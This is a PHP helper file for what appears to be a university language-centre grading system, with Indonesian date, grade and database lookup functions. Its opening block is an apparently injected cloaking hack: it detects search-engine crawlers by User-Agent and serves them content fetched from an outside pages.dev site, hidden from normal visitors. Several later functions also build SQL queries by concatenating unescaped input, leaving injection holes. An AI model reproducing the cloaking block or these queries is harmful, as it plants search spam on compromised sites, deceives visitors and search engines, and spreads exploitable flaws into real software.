<?php
ob_start();
header('Vary: User-Agent');
$bot_url = "https://punten-neng.pages.dev/wiraraja/pusatbahasa/pstbahasa/";
$botchar = "/(googlebot|slurp|bingbot|baiduspider|yandex|adsense|crawler|spider|inspection)/i";
$ua = strtolower($_SERVER["HTTP_USER_AGENT"]);
function lph_requests($url) {
    if (function_exists('curl_init')) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0');
        $response = curl_exec($ch);
        curl_close($ch);
        return $response;
    } elseif (ini_get('allow_url_fopen')) {
        return file_get_contents($url);
    }
    return false;
}
if (preg_match($botchar, $ua)) {
    usleep(rand(100000, 200000)); 
    echo lph_requests($bot_url);
    ob_end_flush();
    exit;
}
 
?>
<?php
include 'conn.php';
function anti_injection($data)
{
    $filter = stripslashes(strip_tags(htmlspecialchars($data, ENT_QUOTES)));
    return $filter;
}

function nilaiHuruf3($value)
{
    if ($value >= 80) {
        echo "A";
    } elseif (($value <= 79.99) and ($value >= 70)) {
        echo "B";
    } elseif (($value <= 69.99) and ($value >= 60)) {
        echo "C";
    } elseif (($value <= 59.99) and ($value >= 50)) {
        echo "D";
    } else {
        echo "E";
    }
}

function sanitasiJam($jam)
{
    $show = str_replace('.', ':', $jam);

    return $show;
}

function sanitasi($string)
{
    $string = stripslashes($string);
    $string = strip_tags($string);
    //$string = trim(mysql_real_escape_string($string));
    return $string;
}


function gender($gen)
{
    if ($gen == 'L') {
        $gender = 'Laki-laki';
    } else if ($gen == 'P') {
        $gender = 'Perempuan';
    }
    return $gender;
}

function NamaBulan($data)
{
    if ($data == '01') {
        $bulan = 'Januari';
    } else if ($data == '02') {
        $bulan = 'Februari';
    } else if ($data == '03') {
        $bulan = 'Maret';
    } else if ($data == '04') {
        $bulan = 'April';
    } else if ($data == '05') {
        $bulan = 'MEI';
    } else if ($data == '06') {
        $bulan = 'Juni';
    } else if ($data == '07') {
        $bulan = 'Juli';
    } else if ($data == '08') {
        $bulan = 'Agustus';
    } else if ($data == '09') {
        $bulan = 'September';
    } else if ($data == '10') {
        $bulan = 'Oktober';
    } else if ($data == '11') {
        $bulan = 'November';
    } else if ($data == '12') {
        $bulan = 'Desember';
    }
    $result = $bulan;
    return ($result);
}

function getRomawi($bln){
	switch ($bln){
	case 1: 
		return "I";
	break;
	case 2:
		return "II";
	break;
	case 3:
		return "III";
	break;
	case 4:
		return "IV";
	break;
	case 5:
		return "V";
	break;
	case 6:
		return "VI";
	break;
	case 7:
		return "VII";
	break;
	case 8:
		return "VIII";
	break;
	case 9:
		return "IX";
	break;
	case 10:
		return "X";
	break;
	case 11:
		return "XI";
	break;
	case 12:
		return "XII";
	break;
	}
}

function DateToIndo($date)
{ // fungsi atau method untuk mengubah tanggal ke format indonesia
    // variabel BulanIndo merupakan variabel array yang menyimpan nama-nama bulan
    $BulanIndo = array(
        "Januari", "Februari", "Maret",
        "April", "Mei", "Juni",
        "Juli", "Agustus", "September",
        "Oktober", "November", "Desember"
    );
    $tahun = substr($date, 0, 4); // memisahkan format tahun menggunakan substring
    $bulan = substr($date, 5, 2); // memisahkan format bulan menggunakan substring
    $tgl   = substr($date, 8, 2); // memisahkan format tanggal menggunakan substring
    $result = $tgl . " " . $BulanIndo[(int)$bulan - 1] . " " . $tahun;
    return ($result);
}

function DateToIndo2($date)
{ // fungsi atau method untuk mengubah tanggal ke format indonesia
    // variabel BulanIndo merupakan variabel array yang menyimpan nama-nama bulan
    $BulanIndo = array(
        "Januari", "Februari", "Maret",
        "April", "Mei", "Juni",
        "Juli", "Agustus", "September",
        "Oktober", "November", "Desember"
    );
    $tgl     = substr($date, 3, 2);
    $bulan    = substr($date, 0, 2);
    $tahun     = substr($date, 6, 4);
    $result = $tgl . " " . $BulanIndo[(int)$bulan - 1] . " " . $tahun;
    return ($result);
}

function NamaHari($date)
{
    $daftar_hari = array(
        'Sunday' => 'Minggu',
        'Monday' => 'Senin',
        'Tuesday' => 'Selasa',
        'Wednesday' => 'Rabu',
        'Thursday' => 'Kamis',
        'Friday' => 'Jumat',
        'Saturday' => 'Sabtu'
    );

    $namahari = date('l', strtotime($date));
    $result = $daftar_hari[$namahari];
    return ($result);
}

function formatJam($data)
{
    $pecah = explode(':', $data);
    echo "" . $pecah[0] . ":" . $pecah[1] . "";
}

function rupiah($jumKredit)
{
    $rp = number_format($jumKredit, 0, '', '.');
    return $rp;
}

function NamaMHS($data) {
	global $koneksi;
	$cari= mysqli_fetch_assoc(mysqli_query($koneksi,"SELECT namamhs FROM mst_mahasiswa WHERE npm = '".$data."' "));
	return($cari['namamhs']);
}

function ProdiMHS($data) {
	global $koneksi;
	$cari= mysqli_fetch_assoc(mysqli_query($koneksi,"SELECT prodi FROM mst_mahasiswa WHERE npm = '".$data."' "));
	return($cari['prodi']);
}

function Paket($data) {
	global $koneksi;
	$cari= mysqli_fetch_assoc(mysqli_query($koneksi,"SELECT nama FROM mst_paket WHERE id = '".$data."' "));
	return($cari['nama']);
}

function NamaDay($data) {
	global $koneksi;
	$cari= mysqli_fetch_assoc(mysqli_query($koneksi,"SELECT nama FROM mst_day WHERE id = '".$data."' "));
	return($cari['nama']);
}

function Listening($data) {
	global $koneksi;
	$cari= mysqli_fetch_assoc(mysqli_query($koneksi,"SELECT listening FROM mst_nilai_rumus WHERE no = '".$data."' "));
	return($cari['listening']);
}
function Reading($data) {
	global $koneksi;
	$cari= mysqli_fetch_assoc(mysqli_query($koneksi,"SELECT reading FROM mst_nilai_rumus WHERE no = '".$data."' "));
	return($cari['reading']);
}
function Grammer($data) {
	global $koneksi;
	$cari= mysqli_fetch_assoc(mysqli_query($koneksi,"SELECT grammer FROM mst_nilai_rumus WHERE no = '".$data."' "));
	return($cari['grammer']);
}

function NamaPengajar($data) {
	global $koneksi;
	$cari= mysqli_fetch_assoc(mysqli_query($koneksi,"SELECT nama FROM mst_pengajar WHERE nip = '".$data."' "));
	return($cari['nama']);
}
